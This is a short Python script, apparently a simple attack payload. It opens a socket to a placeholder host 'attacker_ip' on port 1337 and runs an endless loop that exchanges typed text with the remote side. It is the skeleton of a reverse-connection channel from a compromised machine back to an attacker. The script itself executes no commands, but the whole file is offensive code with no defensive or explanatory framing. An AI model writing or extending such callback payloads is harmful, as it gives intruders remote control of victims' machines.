import socket

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

## create loop that will receive data continuously sent by client machine
while True:
	recv = payload.recv(2048)
	print(recv.decode("utf-8"))

	## if the client machine wants to send information first
	inp = input(">> ")
	## convert the input string into bytes and decoded
	payload.send(bytes(inp, "utf-8"))
